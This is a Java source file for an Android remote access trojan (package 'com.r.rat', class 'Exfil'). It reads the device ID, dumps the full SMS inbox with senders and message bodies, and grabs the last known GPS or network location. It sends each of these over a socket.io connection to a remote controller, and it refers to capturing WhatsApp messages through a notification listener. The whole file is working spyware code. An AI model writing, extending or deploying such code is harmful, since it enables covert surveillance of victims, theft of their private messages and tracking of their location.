package com.r.rat;
import android.content.Context;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.provider.Settings;
import io.socket.client.Socket;
import org.json.JSONArray;
import org.json.JSONObject;
public class Exfil {
    public static String deviceId(Context c) {
        return Settings.Secure.getString(c.getContentResolver(), Settings.Secure.ANDROID_ID);
    }
    public static void dumpSms(Context c, Socket s) {
        JSONArray arr = new JSONArray();
        try (Cursor cur = c.getContentResolver().query(
                Uri.parse("content://sms/inbox"), null, null, null, "date DESC")) {
            while (cur != null && cur.moveToNext()) {
                JSONObject j = new JSONObject();
                j.put("addr", cur.getString(cur.getColumnIndexOrThrow("address")));
                j.put("body", cur.getString(cur.getColumnIndexOrThrow("body")));
                j.put("date", cur.getLong(cur.getColumnIndexOrThrow("date")));
                arr.put(j);
            }
        } catch (Exception e) {}
        try { JSONObject o = new JSONObject(); o.put("sms", arr); s.emit("sms_data", o); } catch (Exception e) {}
    }
    public static void dumpWa(Context c, Socket s) {
        try { JSONObject o = new JSONObject();
              o.put("note", "wa captured via NotifListener; trigger notif_start");
              s.emit("wa_data", o); } catch (Exception e) {}
    }
    public static void dumpLocation(Context c, Socket s) {
        try {
            LocationManager lm = (LocationManager) c.getSystemService(Context.LOCATION_SERVICE);
            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (loc == null) return;
            JSONObject o = new JSONObject();
            o.put("lat", loc.getLatitude()); o.put("lon", loc.getLongitude());
            s.emit("loc_data", o);
        } catch (Exception e) {}
    }
}